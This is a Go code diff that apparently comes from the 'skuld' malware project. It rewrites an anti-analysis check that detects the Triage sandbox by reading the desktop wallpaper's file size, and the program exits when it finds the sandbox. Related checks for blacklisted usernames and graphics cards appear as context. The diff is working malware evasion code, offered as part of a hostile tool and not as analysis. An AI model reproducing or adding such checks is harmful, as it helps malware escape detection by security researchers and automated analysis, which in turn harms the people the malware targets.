@@ -6,7 +6,6 @@ import (
 	"strings"
 	"syscall"
 	"unsafe"
-	"bufio"
 
 	"github.com/hackirby/skuld/utils/hardware"
 	"github.com/hackirby/skuld/utils/requests"
@@ -23,41 +22,32 @@ func contains(slice []string, item string) bool {
 	return false
 }
 
-func isTriage() (bool, error) {
-	var buffer [bufferSize]uint16
+func IsTriage() bool {
+    const bufferSize = 260
+    var buffer [bufferSize]uint16
 
-	ret, _, err := syscall.Syscall6(
-		syscall.NewLazyDLL("user32.dll").NewProc("SystemParametersInfoW").Addr(),
-		4,
-		uintptr(spiGetDesktopWallpaper),
-		uintptr(bufferSize),
-		uintptr(unsafe.Pointer(&buffer[0])),
-		0,
-		0,
-		0,
-	)
-	if ret == 0 {
-		return false, err
-	}
+    ret, _, _ := syscall.NewLazyDLL("user32.dll").NewProc("SystemParametersInfoW").Call(
+        0x0073,
+        uintptr(bufferSize),
+        uintptr(unsafe.Pointer(&buffer[0])),
+        0,
+    )
+    if ret == 0 {
+        return false
+    }
 
-	wallpaperPath := syscall.UTF16ToString(buffer[:])
+    wallpaperPath := syscall.UTF16ToString(buffer[:])
 
-	if _, err := os.Stat(wallpaperPath); err == nil {
-		fileInfo, err := os.Stat(wallpaperPath)
-		if err != nil {
-			return false, err
-		}
+    fileInfo, err := os.Stat(wallpaperPath)
+    if err != nil {
+        return false
+    }
 
-		badWallpapers := map[int64]struct{}{
-			24811: {},
-		}
+    if fileInfo.Size() == 24811 {
+        return true
+    }
 
-		if _, exists := badWallpapers[fileInfo.Size()]; exists {
-			return true, nil
-		}
-	}
-
-	return false, nil
+    return false
 }
 
 func IsBlacklistedUsername(usernames []string) bool {
@@ -136,7 +126,7 @@ func GraphicsCardCheck() bool {
 }
 
 func Run() {
-	if isTriage() {
+	if IsTriage() {
 		os.Exit(0)
 	}
 	
